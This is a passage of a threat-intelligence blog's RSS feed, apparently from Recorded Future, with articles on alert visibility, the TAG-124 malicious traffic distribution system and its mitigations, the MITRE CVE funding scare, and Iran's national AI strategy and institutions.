          <li><strong>Understand what is normal in your systems:</strong> Detecting subtle anomalies requires a deep understanding of baseline network behavior, also known as <a href="https://www.blackfog.com/cybersecurity-101/baselining">baselining</a>. Without this, deviations can go unnoticed.</li>
          <li><strong>Integrate your tools:</strong> Avoid alerting silos. Centralizing and enriching data in a unified platform, such as - Recorded Future’s Collective Insights tool, helps surface more meaningful signals.</li>
          <li><strong>Test alerts with intelligence-driven hunts:</strong> Purple teaming, a method of vulnerability assessment that combines data from red- and blue-team exercises to improve network defense, helps to verify detection capabilities. Red teams can use real-world threat intelligence to simulate the most relevant threats to your company based on activity observed in your industry or region.</li>
        </ul>
        <h2>The Bottom Line for Security Leaders</h2>
        <p>The organizations that will succeed in the years ahead won't be those collecting the most data, instead it will be the ones best equipped to turn that data into action. Recorded Future helps security teams beat the visibility paradox by providing the tools, automation, and intelligence needed to cut through the noise and focus on real threats before they impact your business.

            <description><![CDATA[Discover how cybercriminals use malicious Traffic Distribution Systems like TAG-124 to deliver ransomware and malware to high-value targets in healthcare and critical infrastructure.]]></description>
            <content:encoded><![CDATA[
        <p>Coming across highly targeted advertisements online is a common experience for many US consumers. One way advertisers achieve this is by using traffic distribution systems (TDSs), which collect information about potential customers to <a href="https://www.securitee.org/files/tds-www2021.pdf">direct</a> them to highly targeted ads. Using data from the user’s browser, geolocation, and behavior, a TDS makes rapid decisions on directing traffic to get the most from ad spend. However, cybercriminals also use this infrastructure to deliver highly targeted malware to victims who are most likely to click their links. Malicious TDSs work in much the same way as legitimate TDSs, except they direct victims to the most effective malware instead of the most effective advertisement. Additionally, these TDSs provide a defensive measure to ensure the malware is not delivered to researchers or sandboxes that could analyze the code.</p>
        <p>Insikt Group has been tracking how cybercriminals use these tools and <a href="/research/tag-124-multi-layered-tds-infrastructure-extensive-user-base">identified</a> infrastructure linked to a highly active malicious TDS dubbed TAG-124. TAG-124 allows ransomware operators and other cybercriminals to maximize their chances of infecting their intended victims with their respective payloads. At least two ransomware groups have been observed using TAG-124 to infect victims in health care and other critical infrastructure, demonstrating the value of traffic distribution for “big game hunting” (targeting companies perceived as likely to pay out high extortion demands). While shared infrastructure like TAG-124 helps cybercriminals improve their efficiency and effectiveness, understanding TAG-124 infrastructure can help defenders block or even disable activity from multiple cyber threat actors simultaneously before compromise occurs.</p>

          </div>
        </div>
        <h2>Multiple Threat Actors Use TAG-124 Infrastructure</h2>
        <p>Insikt Group has observed multiple threat actors using this malicious TDS, including:</p>
        <ul>
          <li><strong>Rhysida Ransomware:</strong> A sophisticated <a href="/research/outmaneuvering-rhysida-advanced-threat-intelligence-shields-critical-infrastructure-ransomware">ransomware-as-a-service</a> operation notable for extorting healthcare organizations and other critical infrastructure. In 2023, the group claimed responsibility for an attack on Prospect Medical Holdings, which <a href="https://www.scworld.com/news/rhysida-claims-responsibility-for-ransomware-attacks-on-prospect-medical-holdings">resulted</a> in the theft of over 500,000 social security numbers and <a href="https://blog.barracuda.com/2024/05/09/rhysida-ransomware--the-creepy-crawling-criminal-hiding-in-the-d#:~:text=The%20Prospect%20Medical%20Holdings%20attack%20impacted%2017%20hospitals%20and%20166%20clinics%20across%20the%20United%20States.">impacted</a> operations at seventeen hospitals and 166 clinics.</li>
          <li><strong>Interlock Ransomware:</strong> Another ransomware group targeting primarily <a href="https://www.hipaajournal.com/interlock-ransomware-healthcare/">healthcare organizations</a> and other “big game” to extort higher payouts through high-impact attacks on large organizations. In December 2024, the group <a href="https://www.bleepingcomputer.com/news/security/texas-tech-university-system-data-breach-impacts-14-million-patients/">claimed</a> credit for an attack on the Texas Tech University Health Sciences Center, stealing 2.6 TB of sensitive personal data. Interlock shares many similarities with Rhysida, such as tactics, tools, and encryption behaviors, though the exact relationship between the two is <a href="https://x.com/prodaft/status/1896938856672280591?s=43">unknown</a>.</li>
          <li><strong>TA866 / Asylum Ambuscade:</strong> This cybercrime group <a href="https://www.welivesecurity.com/2023/06/08/asylum-ambuscade-crimeware-or-cyberespionage/">engages in</a> financial targeting and cyber espionage very likely on behalf of the Russian government. The group has targeted bank customers and cryptocurrency traders across North America and Europe and carried out <a href="https://www.proofpoint.com/us/blog/threat-insight/security-brief-ta866-returns-large-email-campaign">espionage</a> against government entities in Europe, Central Asia, and other areas.</li>
        </ul>
        <p>TAG-124 has also been associated with <a href="https://www.proofpoint.com/us/blog/threat-insight/part-1-socgholish-very-real-threat-very-fake-update">SocGholish</a> and <a href="https://www.esentire.com/blog/exploring-the-d3f-ck-malware-as-a-service-loader">D3F@ck</a> loader malware, which provide remote access and malware delivery for financially motivated activity. While Insikt Group does not know which criteria TAG-124 uses to filter and direct malicious content, its use of search engine optimization (SEO) poisoning and infecting legitimate sites allows for an enormous number of potential victims. By outsourcing initial infection to TAG-124, groups like Rhysida and Interlock can pursue “big game hunting” by specializing in techniques implemented during a later stage in the infection kill chain. These special techniques enable more effective extortion campaigns.</p>
        <h3>Risk Outlook</h3>
        <p>Successful big game hunting that results in large payouts allows sophisticated syndicates like Rhysida and Interlock to invest back into services that make their work more effective. This drives the increased specialization of groups like TAG-124, creating a virtuous cycle of cybercrime. As a result, businesses face an increasing risk of high-impact ransomware attacks and espionage-driven data theft: the links between TAG-124 and Asylum Ambuscade suggest that state-sponsored threat actors are also taking advantage of these services in addition to profit-motivated actors.</p>
        <p>Defending against TAG-124 may be challenging due to its early role in the cyberattack life cycle, but missing intrusions early on can still have negative consequences for companies. For example, one of Rhysida’s latest victims, Sunflower Medical, is <a href="https://www.hipaajournal.com/sunflower-medical-group-data-breach-lawsuit/">facing</a> a class action lawsuit because of its failure to implement security measures that would have detected the breach early in the infection cycle. According to the company, the intrusion was not discovered for three weeks following the initial breach. While it is unknown whether TAG-124 was used for this intrusion, the legal consequences demonstrate the significant risks of missing early signs of a breach.</p>
        <h3>Mitigations</h3>
        <p>TAG-124 is not the only TDS operating on behalf of threat actors. Other notable examples include <a href="https://www.darkreading.com/threat-intelligence/vextrio-tds-biggest-cybercrime-operation-web">VexTrio</a>, <a href="https://www.securityweek.com/prometheus-tds-underground-service-distributing-several-malware-families/">Prometheus TDS</a>, and <a href="https://sensorstechforum.com/blacktds-traffic-distribution-network-malicious/">BlackTDS</a>, all of which offer competing malware delivery capabilities. Operators of these systems enable the increasing effectiveness of many different threat actors — primarily criminal, though occasionally state-sponsored — by providing professional infrastructure that adopts legitimate content delivery techniques for criminal use. However, identifying indicators of malicious TDS can help defenders detect and block multiple threat actors early in the attack kill chain.</p>
        <p>Insikt Group recommends the following measures:</p>
        <ul>
          <li><strong>Advanced threat detection:</strong> In addition to blocking known indicators, use host- and log-based detections, such as YARA, Snort, and Sigma rules found in Recorded Future’s Intelligence Cloud, for custom file scanning and detection. These detections can help identify unwanted tools or other suspicious activity.</li>
          <li><strong>User education:</strong> Educate users on the risks of SEO poisoning and urge caution when browsing. In particular, urge caution against unprompted downloads for Google Chrome updates and other indicators associated with TAG-124 infrastructure.</li>
          <li><strong>Secure browser setting:</strong> Enable automatic browser updates and blocking pop-ups to reduce exposure to malicious update prompts.</li>
        </ul>

            <description><![CDATA[The recent uncertainty around MITRE's CVE database highlights a major risk in relying on a single intel source. Learn why diversified, multi-source vulnerability intelligence is crucial for cyber resilience.]]></description>
            <content:encoded><![CDATA[
        <h2>What We Can Learn From The Recent News About the Unknown Future of MITRE’s CVE Database</h2>
        <p>Over the last several days, we have received a lot of inquiries from customers and partners about the recent news on the unknown future of the MITRE National Vulnerability (NVD) database. It is another reminder that in today's rapidly evolving cybersecurity environment, organizations cannot afford to rely on a single stream of intelligence. It also demonstrates why platforms that aggregate multiple intelligence sources are more critical than ever.</p>
        <h2>When Critical Vulnerability Information Sources Are at Risk</h2>
        <p>We tend to think about supply chain disruptions related to physical goods, but this is a wake up call that information supply chains are equally important to consider.</p>
        <p>So what happened? On April 15, 2025, a memo indicated that MITRE's contract to support CVE (Common Vulnerabilities and Exposures) and related programs was set to expire on April 16, 2025. Fortunately, by 9am EDT on April 16, the MITRE contract had reportedly been renewed, and there would be no actual impact or interruptions to vulnerability intelligence services for at least a year- beyond that year is still unknown. While this raised immediate concerns across the cybersecurity community, it also illustrated the importance of diversified <a href="/products/vulnerability-intelligence">vulnerability intelligence</a> sources.</p>
        <h2>Why Multi-Source Vulnerability Intelligence Matters</h2>
        <p>The MITRE situation perfectly exemplifies why organizations need robust, multi-source intelligence platforms rather than a dependency on single sources, namely:</p>
        <h3>Resilience Against Source Disruptions</h3>
        <p>When a key intelligence source experiences disruption, organizations with diversified sources can maintain operational continuity.</p>
        <h3>Comprehensive Coverage</h3>
        <p>Different intelligence sources often capture different aspects of vulnerabilities. Vendor advisories might contain details not yet reflected in the National Vulnerability Database (NVD).</p>
        <h3>Timely Intelligence</h3>
        <p>Multiple sources allow for earlier detection of vulnerabilities, as information often appears in specialized forums or vendor bulletins before being officially cataloged.</p>
        <h3>Contextual Richness</h3>
        <p>By aggregating multiple intelligence streams, organizations gain a more nuanced understanding of vulnerabilities, including real-world exploitation status.</p>
        <h2>The Evolving Information Supply Chain</h2>
        <p>The cybersecurity intelligence landscape has been undergoing a fundamental transformation for some time. In fact, this is the very reason Recorded Future was formed as a company nearly 15 years ago. Centralized information sources need to be complemented by a distributed network of intelligence mirroring the world. This shift represents a new paradigm in how security intelligence flows:</p>
        <h3>From Centralized to Distributed</h3>
        <p>Organizations are moving away from reliance on single, authoritative sources toward networks of complementary intelligence.</p>
        <h3>From Reactive to Proactive</h3>
        <p>Multi-source intelligence enables earlier detection and faster response to emerging threats.</p>
        <h3>From Generic to Contextual and Precise</h3>
        <p>Diverse sources provide richer context, allowing for more precise risk assessment tailored to specific organizational environments.</p>
        <h2>Practical Steps for Security Teams</h2>
        <p>For security professionals, this shift necessitates adjustments in vulnerability management workflows:</p>
        <h3>Diversify CVE Sourcing for Vendor Risk Ratings</h3>
        <p>Recorded Future automates risk alerting and tracking, including CVEs by severity. Beyond MITRE NVD's CVSS scores, we incorporate proprietary and open source scoring and data. This has enabled us to alert on vulnerabilities, <strong>an average of 11 days</strong>, before NVD even computes their risk scores, as exemplified in the screenshot from our platform.</p>
        <p><em>The screenshot from our platform below of a Recorded Future alert captured before NVD scoring - providing early warning signals of potential risk.</em></p>

        </p>
        <p>Evaluate Source Dependencies</p>
        <p>Review current intelligence sources to identify potential single points of failure in your security information supply chain.</p>
        <p>Implement Resilient Workflows</p>
        <p>Design vulnerability management processes that can adapt to changes in intelligence sources without operational disruption.</p>
        <p>Know How to Action the Data</p>
        <p>Having a robust and resilient information supply chain is important, but equally important is knowing what to action on and how to do it. <a href="/platform/demo-center">Actionable intelligence</a> is the only intelligence that matters. Organizations require additional detail on the exposures and tactics along with specific threat hunting packages. (See screen shot below of a TTP validated by our Insikt group research team along with the attached YAML threat hunt package to eradicate it.)</p>
        <p>
          <img loading="lazy" alt="mitre-cve-004.png" src="https://www.recordedfuture.com/media_1729b7221fd41167931e77a68910107927e468f4f.png?width=750&amp;format=png&amp;optimize=medium" width="1600" height="822" />
        </p>
        <h2>Conclusion: The Power of Intelligence Integration</h2>
        <p>The recent MITRE contract situation serves as a timely reminder that in cybersecurity intelligence, diversity and integration are strengths. It is very likely that additional community and open sources will emerge to expose and track this information, which will be great incremental sources. Organizations that leverage platforms capable of aggregating, normalizing, and contextualizing intelligence from multiple sources gain significant advantages in risk identification, prioritization, and mitigation. They are also more protected from disruptions related to any one particular source. This is supply chain management 101.</p>
        <p>Even better is when the platform can automate and proactively take action based on a wide variety of intelligence sourcing. As information supply chains continue to evolve, the most resilient security postures will belong to those organizations that embrace multi-source intelligence platforms—ensuring that when one source experiences disruption, the flow of critical security intelligence and automation continues uninterrupted.</p>
        <p>Recorded Future will continue help on this mission in every way we can. In addition to CVE information, we track over 4,000 threat actors, including 430 nation-state sponsored groups, and a variety of other sources of threats used in our analysis and recommendations. We actively monitor more than 90,000 command and control servers while scanning 30 million domains and URLs each day. We make some of this available for free in our public vulnerability database site, where you can see trending vulnerabilities and search for CVEs and software: <a href="/vulnerability-database">https://www.recordedfuture.com/vulnerability-database</a></p>

        <p>Iran recognizes the vital role artificial intelligence (AI) will play in its future economic viability, regional influence, and national security and has begun to implement a top-down effort to achieve regional technological competitiveness. Since the Supreme Leader issued a directive in 2021, Iran has endeavored to develop a national strategy and oversight mechanism for AI and foster a technological ecosystem to drive domestic research and development. However, two key factors — Tehran’s global economic isolation, and its deeply entrenched system of government control and oversight — have almost certainly hindered Iran’s national AI development.</p>
        <p>In 2024, as Tehran’s support for its proxies Hamas and Hezbollah against Israel embroiled Iran in unprecedented regional conflicts and ongoing cyberwarfare, new insights emerged about how Iran has implemented AI technologies in its national security apparatus. Iran has used AI to bolster its capabilities in four main areas: cyberattacks, influence operations, military and intelligence systems, and domestic repression. These priorities will continue to propel Iran’s development and implementation of AI, almost certainly posing an increasing threat to Iran’s Western and regional adversaries. In cyberspace, AI will likely augment Iranian threat actors’ spearphishing and social engineering tradecraft, while AI’s implementation in Iran’s drone and missile arsenal is likely to pose the greatest physical threat from emerging technology.</p>
        <p>Iran’s approach to AI will likely mirror its broader strategic ambitions — to be a regional power and assert its national sovereignty — by building and implementing advanced technological capabilities. Iranian government initiatives are likely to be the driving force behind Iran’s AI development priorities, particularly given the absence of a flourishing AI private sector. While Tehran will promote its own technological prowess and indigenous AI development, the Iranian government is likely to leverage its relationship with China and Russia in various security realms to bolster its AI technology capabilities. Private industry, particularly companies in the AI or technology resources industry, should closely monitor end users of their models or materials to ensure Iranian threat actors are not using their products or acquiring controlled technologies. Similarly, governments should invest in identifying and preventing the Iranian defense industry from acquiring AI technologies that enhance its military capabilities.</p>
        <h2>Key Findings</h2>
        <ul>
          <li>Iran has articulated lofty goals for its AI advancement and seeks to compete in the global AI race, but it is almost certainly hindered by two factors: First, its economic and commercial isolation limits its access to technological resources and human capital. Second, its top-down government control and oversight stifles private innovation in AI.</li>
          <li>To augment its own indigenous research and development (R&amp;D) capabilities in AI, Iran will likely leverage its bilateral and regional relationships for technology engagement with China, Russia, and other non-Western countries.</li>
          <li>Amidst unprecedented domestic upheaval and regional conflict over the last three years, Iran very likely views AI as a key force multiplier for its national security and defense and has sought to integrate AI into its cyber and influence operations, military systems, and domestic surveillance infrastructure.</li>
          <li>It is very likely that Iranian threat actors will increasingly use generative AI and large language models (LLMs) to enhance their influence and cyber operations, increasing risk to adversarial governments, as well as their critical infrastructure, technology companies, and other security-related industries.</li>
          <li>Iran has very likely endeavored to implement AI in its military defense systems and publicly touts the capability, though its operational uses of the technologies remain unproven.</li>
          <li>In the domestic sphere, Iran has very likely increased its efforts to deploy AI for morality enforcement and opposition monitoring, to enhance its control over Iranian society, particularly after the Woman Life Freedom protest movement.</li>
          <li>Companies and governments should maintain vigilance in cybersecurity practices to reduce vulnerabilities to AI-enabled cyber and influence operations and limit Iran’s access to AI resources and expertise that could increase Tehran’s threat to regional security.</li>
        </ul>
        <h2>Iran’s AI Ambitions</h2>
        <p>At the highest level of its leadership, Iran has recognized and sought to develop an overarching national focus on AI ( هوش مصنوعی in Persian). In November 2021, Supreme Leader Ali Khamenei called AI “an important and futuristic issue” that will “play a role in the future administration of the world,” and <a href="https://www.memri.org/reports/irans-supreme-leader-khamenei-we-must-master-all-layers-artificial-intelligence-technology">urged</a> Iran to become a top ten country in the field of AI. In August 2024, Khamenei urged Iran to “master” and “develop the deep and diverse layers of AI technology,” warning that a global oversight body (similar to the International Atomic Energy Agency [IAEA]) might regulate its use in the future. Khamenei’s stated ambition for Iran’s AI prominence initiated a flurry of government-led activity to develop and implement a national strategy and technological ecosystem to align with the Supreme Leader’s intent. Iran subsequently began creating a national AI roadmap that evaluated the “strategic documents” of 23 countries in the field of AI and developed a plan to realize Khamenei’s goal by 2032. The goals of the roadmap document were to achieve “80 percent of research to meet the needs of the country, use of 45 percent of AI in industries, $8 billion investment in AI, and a 12 percent share of AI in the GDP." The document contained fourteen “macro policies,” 47 “micro-policies,” 39 “general actions,” and 155 “projects and activities.” According to the roadmap, by the Persian year 1410 (starting March 2031), Iran would need to train 600,000 experts in the AI field to accomplish these objectives.</p>
        <p>Iran’s presidency — specifically, the Vice Presidency for Science, Technology and Knowledge-based Economy — oversees the Iranian government’s effort to establish and implement an AI strategy. On December 3, 2023, President Ebrahim Raisi issued an executive order to establish the “National Steering Committee and the National Artificial Intelligence (AI) Center,” which would “focus on creating integrated AI processing and data service providers, aligning with the country’s needs, and implementing large-scale AI projects." He appointed Reshad Hosseini as Secretary for the Development of Artificial Intelligence and Robotics Headquarters, a role intended to develop a “technology development roadmap” and to make “maximum use of all the internal capacity of the innovation ecosystem." Iran’s AI Strategic Council was to be formed of “ministers and heads of relevant institutions” to “implement, coordinate, and monitor” a National AI Document.</p>
        <p>After Raisi’s death in May 2024, the administration of President Masoud Pezeshkian has continued to emphasize Iran’s AI strategy. The National AI Organization (or the National Organization for AI) was inaugurated in July 2024 in Tehran. Insikt Group identified the organization’s physical location in north central Tehran, on Molla Sadra Street (Figures 1-3). During Pezeshkian’s endorsement ceremony and National Government Week meeting in August 2024, Khamenei advised the new administration that the ”good initiative” begun under deceased President Raisi “unfortunately remains unfinished,” but advised that the National AI Organization, under the direct supervision of the President, should continue Raisi’s progress. On October 15, 2024, Iran’s Information Technology Council issued a decision that “within two months, the National Organization of Artificial Intelligence should present to the working group the requirements for creating, developing, maintaining and publishing data and information in the hyper scale database of artificial intelligence."</p>
        <p>Pezeshkian appointed Hossein Afshin, a professor of mechanical engineering at Sharif University of Technology, as his Vice President for Science, Technology, and Knowledge-based Economy, who also serves as the secretary and vice president of the National AI Organization and serves as the face of AI development within Iran. Pezeshkian also assigned his First Vice President, Dr. Mohammad Reza Aref, as chairman of the National AI Organization and its strategic council. Aref’s appointment as First Vice President <a href="https://amwaj.media/en/media-monitor/critics-slam-return-of-lord-of-silence-as-iran-s-first-vice-president">prompted</a> criticism for his “political obscurity,” likely reflecting Pezeshkian’s choice for the position was based on his scientific prowess and technical acuity rather than his accomplishments as a reformist politician. The prominent role of Aref — who holds two advanced degrees in electrical engineering from Stanford University, has been a professor at two prestigious Iranian universities, and has <a href="https://ieeexplore.ieee.org/author/37300306900">published</a> scholarly articles on information technology — as Pezeshkian’s deputy with oversight of the country’s AI program suggests an increasing recognition of the importance of AI.</p>

        <h2>Laying the Foundations of an AI Ecosystem</h2>
        <p>Insikt Group examined Iranian government statements, press releases, leadership speeches, academic journals, industry websites, and news media, all of which provide key insights into the development and deployment of AI in Iran. However, these sources often provide broad knowledge about Iran’s ambitions or intentions regarding AI and lack details on the specific models, technology, or deployment of AI in support of national security objectives. Western AI companies, such as OpenAI, Google, and Microsoft, as well as global cybersecurity and military experts, offer additional perspectives and analysis of Iran’s AI use cases.</p>
        <h3>National AI Strategy Development and Challenges</h3>
        <p>Following its leader’s 2021 directive, the Islamic Republic has striven to develop and integrate AI through the establishment of various bureaucratic entities and industry initiatives. Iran’s progress in AI advancement is almost certainly limited by two factors: (1) its economic and commercial isolation and (2) its government control and oversight. After years of international sanctions and commercial isolation, Iran’s technological advancement, particularly in security-related industries such as defense, energy, and maritime shipping, depends on indigenous and domestically engineered capabilities. Iran <a href="https://www.atlanticcouncil.org/blogs/iransource/iran-s-troubled-quest-for-food-self-sufficiency/">strives</a> for self-sufficiency in various sectors, including food and energy, and this concept of a “resistance economy,” which <a href="https://www.washingtoninstitute.org/policy-analysis/khamenei-attempts-restore-optimism-and-normality-nowruz-speeches">underpins</a> Iranian strategic culture and economic development priorities, very likely shapes the development of Iran’s AI ecosystem. The Iranian government almost certainly <a href="https://www.cambridge.org/core/journals/iranian-studies/article/artificial-intelligence-in-iran-national-narratives-and-material-realities/9D2C33F3F1BC459712651443F1D203FB">disseminates</a> the narrative that Iran is a competitor in an AI global race and seeks to prove its technological prowess. As a result of Iran’s national ambitions for AI, its development ecosystem is very likely government-driven, in partnership with private industry and academia. Iranian technological leaders very likely understand that foreign advances in AI computing power, including private technology companies, can both benefit and augment Iran’s own internal efforts and uses. This dynamic — a top-down national strategy and AI technical development framework that is supported rather than driven by Iran’s own private sector innovation — is likely to limit the potential of Iran’s AI advances.</p>
        <p>Iran’s own private sector innovation is likely stifled by its economic isolation and its dependencies on government funding and direction. Iran claims that the government’s expanded support to the tech sector resulted in a surge of Iranian venture capital firms, accelerators, and “innovation centers” between 2019 and 2020, as these firms provided localized solutions amid global supply chain disruption (after the US withdrew from the Iran nuclear agreement and re-imposed sanctions). However, according to a 2022 United Nations <a href="https://www.undp.org/publications/mapping-existing-innovation-ecosystem-ir-iran">report</a> on Iran’s innovation landscape, sanctions significantly hampered Iran’s “startup ecosystem” and the domestic and foreign appetite for investments in Iranian technology startups after 2018 was “reduced substantially.” Iran’s challenges and limitations are reflected in several global indices that analyze and measure AI advances and technological innovation across countries. Stanford University’s Global AI Vibrancy Tool, which <a href="https://hai-production.s3.amazonaws.com/files/global_ai_vibrancy_tool_08.27.24.pdf">defines</a> AI vibrancy as “the level of activity, development, and impact of AI technologies within a country,” does not include Iran in its analysis of 36 countries leading AI-related metrics. Iran is ranked 64th in the Global Innovation Index, which <a href="/research/irans-ai-ambitions-balancing-economic-isolation-national-security-imperatives?host=https%3A%2F%2Fwww.recordedfuture.com">reflects</a> a notable improvement over the last ten years. However, Iran’s institutional, regulatory, and business environments ranked 127th, 131st, and 128th, respectively, underscoring the systemic challenges to Iran’s innovation ecosystem. Oxford Insights <a href="https://www.wipo.int/web-publications/global-innovation-index-2024/assets/67729/2000%20Global%20Innovation%20Index%202024_WEB3lite.pdf">ranked</a> Iran 91st of 193 countries in the 2024 “Government AI Readiness Index,” a three-position improvement from its 2023 ranking, but scored lowest in the “vision,” “adaptability,” and “maturity” dimensions.</p>
        <p>In 2022, Iran revealed fifteen policies shaping its AI development roadmap. A key theme underpinning these policies was the importance of national research centers, private industries, and universities working together to advance Iran’s AI development. Notably, two of the policies sought to support the private industry’s use of “academic plans” and to increase private industry’s trust in universities, likely suggesting a divide between Iran’s technical industry and its academic institutions. Another key theme of the policies was increasing foreign engagement and cooperation between Iranian and foreign academic centers. This likely reflects Iran’s interest in leveraging foreign partnerships, particularly with countries that are adversarial to the West, in the AI field.</p>
        <p>In July 2023, a study from the Journal of Science &amp; Technology Policy found that “the artificial intelligence ecosystem in [Iran] has not yet taken shape in the true sense” and “there is still no relative consensus among actors for dividing tasks and missions." Less than a year later, the same journal — which is affiliated with Iran’s National Science Policy Research Center — published a Nowruz 1403 (Persian new year, corresponding with March 2024) special edition entitled “Generative Artificial Intelligence: Multiple Perspectives on Opportunities, Challenges, and Implications in Research, Practice, and Policymaking” that examined the “abundant ethical and legal opportunities and challenges” of AI, specifically ChatGPT’s “practical, ethical, semantic, and policy challenges." The study’s conclusion highlighted the “lack of well-developed ethical guidelines” and noted that it is “vital that new rules be established to govern these instruments, and given their global nature, international coordination is also necessary to maximize their benefits.” The 43 “expert” authors from various business and technological fields disagreed about whether ChatGPT should be restricted or legalized in Iran.</p>
        <p>Iran’s bureaucratic challenges in the AI realm, including changes in presidential administrations and a plethora of organizational stakeholders with overlapping responsibilities, likely limit the country’s ability to implement an overarching strategy for its AI development. Tehran’s policy toward AI is overseen by Iran’s Supreme Council of the Cultural Revolution (SCCR) — a strategic policy body that answers only to the Supreme Leader — whose approval in June 2024 was required to move forward with the National AI Organization, steering council, and the document’s “generalities.” This approval involved review of the AI organization’s statutes and 18,000 supporting documents to ensure the project was not “tainted by Western influence.” The SCCR established a specialized Commission for AI in September 2022 composed of officials from all armed forces branches, the General Staff of the Armed Forces, the Office of the Supreme Leader, the Ministry of Intelligence, and the Ministry of Higher Education. In January 2025, Pezeshkian noted the importance of AI development in a meeting with the SCCR, asserting that “any delay or backwardness in the development of AI in Iran would be damaging and irreparable.” Domestic critics of Iran’s AI policy have raised concerns about the “unstable decisions, constant policy changes, and lack of a clear roadmap” that has hampered the country’s AI program. For example, in December 2024, Afshin announced that the cabinet was drafting a charter for the National AI Organization that would focus on the organization’s role in planning and overseeing AI activities; three months later, semi-official news agency Tasnim News suggested the possibility that the National AI Organization could be dissolved, raising a “series of contradictions” and “unanswered ambiguity.”</p>
        <h3>AI Budget</h3>
        <p>Documentation of Iran’s investment and funding of AI is opaque, but even with conflicting information, Iran’s lack of significant AI funding compared to its competitors will likely imperil its top-ten AI ambitions. The SCCR reportedly allocated a budget totaling 3.5 trillion Tomans (“over 83 million dollars”) in its approval; Iran’s initial operating budget for AI has also been reported as $50 million USD. According to the Tehran Times, 50 trillion rials (“some $100 million”) has been allocated for the development of AI operators during Persian year 1403 (between March 2024 and March 2025). In January 2025, Iran’s National Development Fund — independent of the Iranian government budget — agreed to allocate $15.6 million USD to AI projects in universities and private research centers, while another $100 million USD will be provided in the form of loans. These funding numbers lag significantly behind the AI budgets of regional competitors like the United Arab Emirates (approximately $1.2 billion USD) and Saudi Arabia (approximately $2 billion USD).</p>
        <h3>Government Entities</h3>
        <p>Insikt Group identified a number of government entities that are involved in the direction, strategic planning, and national coordination for the development of Iran’s AI capabilities. The protracted process for the formulation of Iran’s national AI strategy document, which has <a href="https://ideaagency.net/irans-advancements-in-ai-collaboration-on-national-strategy/">involved</a> a cross-agency collaboration process with multiple stakeholders, likely reflects a bureaucratic competition for influence and ownership of AI leadership within the Iranian government. The division of power among various government elements has likely hampered Iran’s ability to form a cohesive AI strategy and development plan.</p>

        <p><strong><em>Table 1:</em></strong> <em>Iranian entities involved in AI strategy (Source: Recorded Future)</em></p>
        <p>Iran’s military plays a key role in technological developments through civil-military cooperation, which very likely extends into the AI realm. Iranian armed forces, including the Islamic Revolutionary Guard Corps (IRGC), have <a href="https://cira.exovera.com/research-analysis/irgcs-involvement-in-science-technology-parks-blurs-line-between-civilian-military/">affiliated</a> universities and science and technology (S&amp;T) parks and run their own technology parks as “incubators.” For example, Imam Hossein University — affiliated with the IRGC — has a technology center and hosted “The International Conference on Artificial Intelligence and the Future Civilization” on January 29, 2025. Iran’s military branches from the Army and IRGC’s ground, naval, and air forces each have their own research and development entity, <a href="https://link.springer.com/chapter/10.1007/978-3-031-58649-1_19">referred</a> to as a Research Self-Sufficiency and Jihad Organization (RSSJO), that conducts specialized and tailored R&amp;D for the unique needs of their respective forces. These RSSJOs are likely involved in independent efforts in defense-related R&amp;D and in cooperation with academic institutions; they are likely integrating AI development into those efforts. Iran’s Ministry of Defense and Armed Forces Logistics (MODAFL) also likely has a key role in defense-related AI development, having signed partnership agreements with 80 universities and 800 industrial towns in Iran.</p>
        <h3>Government Initiatives</h3>
        <p>Announcements by the Vice Presidency for Science, Technology and Knowledge-based Economy regarding its AI development initiatives likely suggest Iran is working to develop a sovereign AI capability — meaning an Iranian national capability to <a href="https://aimagazine.com/articles/what-is-sovereign-ai-and-why-is-it-gaining-traction">produce</a> AI using its own infrastructure, data, workforce, and business networks through the development of foundation models trained on local datasets that reflect local language and culture. Hossein Afshin, Iran’s Vice President for Science, Technology and Knowledge-based Economy, hosted a meeting with the “Technology Group” from Tarbiat Modarres University on December 1, 2024, during which he reviewed the team’s progress, requirements, and support mechanisms for its “Project for Designing a Large Native Iranian Language Model.” He subsequently announced on December 3, 2024, that a prototype of Iran’s “national AI operating system,” which was “designed to host AI algorithms locally,” was expected in six months. Iran intends to launch the country’s first GPU data center by 2025 and plans to establish its first AI park — to “showcase the technological developments of the country and provide practical AI-related services to the people” — within the next two years.</p>
        <p>On March 15, 2025, Vice President Afshin unveiled Iran’s national AI platform and announced a phased rollout of the project, framing it as a strategic move in a global “war of chips and algorithms.” The platform’s initial testing and optimization are planned for the first half of 2025, followed by limited access for technology experts and companies in the third quarter, a public beta release in September 2025, culminating with a public release in approximately March 2026. Over 100 Iranian professors and researchers collaborated on the project, which was developed in cooperation with Sharif University of Technology — an institution that is <a href="https://www.opensanctions.org/entities/NK-nxBVUwhmE8JFVPkiVzKVaS/">sanctioned</a> for its links to the IRGC and MODAFL related to military and ballistic missile technology development. An expert developer and representative of Sharif University, Hossein Asadi, noted that the AI platform was developed using an open-source framework and specifically highlighted that it would be “entirely independent, with no reliance on foreign APIs [application programming interfaces],” ensuring the platform’s services would continue without disruption “even if the country’s internet were to be completely disconnected.”</p>
        <p>Iran almost certainly seeks to leverage domestic resources to support these development initiatives. On December 13, 2024, Afshin declared the government’s intention to jumpstart domestic chip production for AI through the “Sahand National Project” (“پروژه ملی سهند”). The Sahand National Project is consistent with Iran’s focus on leveraging its own human and natural resources to deliver indigenous technological solutions and is likely a reaction to an anticipated increase in economic isolation under the US presidential administration of Donald Trump. The US government <a href="https://bidenwhitehouse.archives.gov/briefing-room/statements-releases/2025/01/13/fact-sheet-ensuring-u-s-security-and-economic-strength-in-the-age-of-artificial-intelligence/">announced</a> export restrictions on January 13, 2025, which are designed to curtail the sale of chips with high-computational graphics processing unit (GPU) power for AI advanced development (such as Nvidia’s A100 and H100 chips) to sanctioned countries like Iran.</p>
        <p>According to Iranian media, the project’s aim is to manufacture “nine-nines” (99.9999999%) purity silicon wafers, the first step in setting up a domestic supply chain for microchips, with a view to open Iran’s first GPU data center by “early 2025.” While public information on the project remains limited, its reported location — in Sahand, East Azerbaijan province — would likely have been chosen for its proximity to <a href="https://www.crunchbase.com/organization/sahand-industrial-group">Sahand Industrial Group</a> (SIG), Iran’s leading glass and silica producer, and the Sahand University of Technology, which has specialized laboratories in material and nanomaterial engineering. Using satellite imagery, Insikt Group identified a new two-million-square-foot facility under construction near an existing SIG silica manufacturing plant in Sahand, showing significant investment in the region’s industrial capabilities.</p>

